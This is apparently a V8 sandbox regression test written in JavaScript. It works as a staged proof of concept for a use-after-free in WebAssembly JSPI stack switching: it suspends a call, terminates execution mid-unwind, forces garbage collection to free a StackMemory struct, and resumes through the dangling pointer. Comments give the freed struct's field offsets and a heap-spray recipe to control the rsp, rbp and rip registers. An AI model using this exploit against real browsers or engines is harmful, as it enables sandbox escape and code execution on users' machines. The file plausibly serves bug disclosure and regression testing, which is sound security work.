// Copyright 2026 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --sandbox-testing --allow-natives-syntax --expose-gc

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');
d8.file.execute('test/mjsunit/sandbox/wasm-jspi.js');

let builder = new WasmModuleBuilder();
let resolve_p;
let p = new Promise(r => resolve_p = r);
let suspending = new WebAssembly.Suspending(() => p);
let suspend_idx = builder.addImport("m", "suspend", kSig_v_v);
let terminate = () => { %TerminateExecution(); };
let term_idx = builder.addImport("m", "terminate", kSig_v_v);

builder.addFunction("main", kSig_v_v)
  .addBody([
    kExprCallFunction, suspend_idx,
    kExprCallFunction, term_idx,
  ]).exportFunc();

let instance = builder.instantiate({m: {suspend: suspending, terminate}});
let promising = WebAssembly.promising(instance.exports.main);

// Stage 1: suspend.
promising();
let resume_data = get_resume_data(p);
let resume_cb = Sandbox.getObjectAt(
    getField(getField(getPtr(p), kJSPromiseReactionsOrResultOffset),
             kPromiseReactionFulfillHandlerOffset));
print("[*] suspender handle: 0x" + get_suspender(resume_data).toString(16));

// Resolve the suspender's EPT now to learn where the StackMemory* lives.
// (We can't read the EPT directly from in-sandbox, but we can observe via
//  trace flags or just blast ahead.)

setTimeout(() => {
  // Stage 3: stack_X is in the pool, suspender EPT was NOT cleared.
  print("[*] post-term: handle still 0x" + get_suspender(resume_data).toString(16));

  // Stage 4: free everything in the pool. ~StackMemory deletes segments
  // (munmap of stack pages) and operator-deletes the struct.
  print("[*] gc(last-resort) → ReleaseFinishedStacks → ~StackMemory");
  gc({type:'major', execution:'sync', flavor:'last-resort'});

  // Stage 5: resume via dangling EPT.
  //
  // EPT resolves to the freed StackMemory* (process heap, outside sandbox).
  // SwitchStacks<Inactive,Suspended> at isolate.cc:4363 reads
  // to->jmpbuf()->state from freed memory. Under ASan this is the violation
  // directly (poisoned read at out-of-sandbox addr). Without ASan, spray
  // 184-byte allocations with state=1 at +68 to reach LoadJumpBuffer →
  // controlled rsp/rbp/rip from sp(+24)/fp(+32)/pc(+40).
  //
  // Layout extracted from ASan report:
  //   sizeof(StackMemory) = 184
  //   jmpbuf_.state       = +68  (Suspended = 1)
  //   jmpbuf_.sp          = +24  (kStackSpOffset)
  //   jmpbuf_.fp          = +32
  //   jmpbuf_.pc          = +40
  //   jmpbuf_.parent      = +56  (must satisfy SBXCHECK_EQ(parent->state, Inactive))
  print("[*] resuming via dangling EPT (struct freed)...");
  resume_cb(undefined);
  print("[!] no violation — non-ASan build, add 184-byte spray with state=1 @+68");
}, 0);

// Stage 2: terminate → cross-stack unwind → bug.
print("[*] resolving → terminate");
resolve_p();
